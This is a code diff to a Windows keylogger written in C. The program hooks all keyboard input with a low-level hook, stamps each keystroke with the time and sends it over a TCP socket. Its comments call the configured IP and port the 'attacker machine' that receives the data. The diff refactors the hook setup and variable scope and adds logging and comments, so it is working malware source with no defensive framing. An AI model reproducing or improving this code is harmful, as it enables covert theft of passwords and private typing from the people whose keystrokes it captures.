@@ -8,8 +8,10 @@
 #include <stdlib.h>
 
 #define WM_APP_KEYDATA (WM_APP + 1)
-#define SERVER_IP "10.217.16.124"
-#define SERVER_PORT 4269
+
+// following values are supposed to be changed
+#define SERVER_IP "127.0.0.1" // ip of the attacker machine
+#define SERVER_PORT 1025 // port number which is open to receive on attcker machine
 
 // function declaration
 LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -25,20 +27,15 @@ typedef struct {
 // global variables
 HHOOK keyboardHook;
 SYSTEMTIME stUTC;
+
+// required to pass messages from thread spawned for keyboard hook procedure to main thread (PostThreadMessage)
 DWORD dwMainThreadId;
 
-
+// entry point for gui apps on windows
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
     dwMainThreadId = GetCurrentThreadId();
 
-    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
-    if (!keyboardHook) {
-        fprintf(stderr, "Error: Failed to set keyboard hook. Error code: %lu\n", GetLastError());
-        return EXIT_FAILURE;
-    } else {
-        wprintf(L"Keyboard hook set successfully.\n");
-    }
 
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
@@ -64,15 +61,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return EXIT_FAILURE;
     }
 
-    int bytesSent;
-    WCHAR keyNameW[12];
-    char keyNameA[24];
-    BYTE keyboardState[256];
-    char fKeyInfo[128];
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+    if (!keyboardHook) {
+        fprintf(stderr, "Error: Failed to set keyboard hook. Error code: %lu\n", GetLastError());
+        return EXIT_FAILURE;
+    } else {
+        wprintf(L"Keyboard hook set successfully.\n");
+    }
+
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         if (msg.message == WM_APP_KEYDATA) {
             KEYDATA* pKeyData = (KEYDATA*)msg.lParam;
+
+            char keyNameA[24];
+            WCHAR keyNameW[12];
+            BYTE keyboardState[256];
+            char fKeyInfo[128];
+            int bytesSent;
 
             if (pKeyData) {
                 switch (pKeyData->vkCode) {
@@ -131,9 +137,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 if (bytesSent == SOCKET_ERROR) {
                     fprintf(stderr, "Error: Failed to send key message. Error code: %lu\n", GetLastError());
                     continue;
+                } else {
+                    printf("Bytes sent: %d\n", bytesSent);
                 }
 
-                free(pKeyData);
+                free(pKeyData); // freeing the malloc which was executed in hook
             }
 
         } else {
@@ -157,7 +165,6 @@ LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
-            // stUTC, pKeyData->vkCode
             KEYDATA* pData = (KEYDATA*)malloc(sizeof(KEYDATA));
             if (pData != NULL) {
                 pData->dateTimeStamp = stUTC;
